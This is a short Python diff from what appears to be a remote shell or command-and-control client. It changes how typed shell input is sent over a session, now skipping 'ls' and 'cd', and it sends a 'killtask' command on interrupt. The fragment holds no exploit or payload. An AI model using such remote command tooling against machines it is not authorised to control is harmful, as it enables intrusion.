@@ -61,8 +61,11 @@ class command:
 				return
 			else:
 				try:
-					result = session.send_command({'cmd':'','args':shell})
-					if result:
-						print(result.decode().rstrip())
+					if shelld == "ls" or shelld == "cd":
+						pass
+					else:
+						result = session.send_command({'cmd':'','args':shell})
+						if result:
+							print(result.decode().rstrip())
 				except KeyboardInterrupt:
 					session.send_command({"cmd":"killtask"})
